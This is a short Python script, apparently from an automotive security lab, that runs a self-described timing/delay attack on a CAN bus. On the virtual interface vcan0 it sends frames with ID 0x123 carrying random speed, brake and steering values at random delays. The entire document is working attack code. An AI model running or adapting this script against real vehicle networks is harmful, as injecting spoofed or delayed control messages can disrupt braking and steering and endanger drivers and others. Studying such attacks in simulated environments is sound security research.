import can
import time
import random

bus = can.interface.Bus(
    channel='vcan0',
    interface='socketcan'
)

print("[ATTACK] Timing / Delay attack started")

try:
    while True:
        speed = random.randint(30, 60)
        brake = random.choice([0, 1])
        steering = random.randint(-10, 10)

        payload = [
            speed & 0xFF,
            brake & 0xFF,
            (steering + 128) & 0xFF,
            0x00
        ]

        msg = can.Message(
            arbitration_id=0x123,
            data=payload,
            is_extended_id=False
        )

        delay = random.uniform(0.5, 2.0)  # artificial delay
        time.sleep(delay)

        bus.send(msg)
        print(f"[DELAYED] Sent after {delay:.2f}s delay")

except KeyboardInterrupt:
    print("\n[ATTACK] Delay attack stopped")

finally:
    bus.shutdown()
